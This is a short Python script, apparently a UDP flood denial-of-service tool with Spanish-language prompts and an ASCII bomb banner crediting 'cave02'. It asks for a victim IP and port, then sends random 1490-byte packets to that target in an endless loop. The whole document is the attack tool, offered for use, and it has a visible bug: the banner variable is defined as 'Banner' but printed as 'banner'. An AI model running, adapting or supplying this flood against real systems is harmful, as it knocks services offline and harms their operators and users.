import socket,os,random

s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)
Banner = """
        ##
       #
      #
     ###
  ##########
 #          #  by : cave02
#            # github :\033[36m https://github.com/cave02/ddos\033[0m
#   Bomba!   #
#            #
 #          #
  ##########
"""
os.system("clear")
print(banner)
print("[*] presiona CTRL C para detener Dos")
print("[*] solo puertos http o https")
print()
ip = input("[*] Victima : ")
port = int(input("[*] puerto : "))
os.system("clear")
print(banner)
print(f"[\033[32;1m+\033[0m] victima : {ip}")
print(f"[\033[32;1m+\033[0m] enviando Dos por el puerto : {port}")
while True:
	s.sendto(bytes, (ip,port))
 
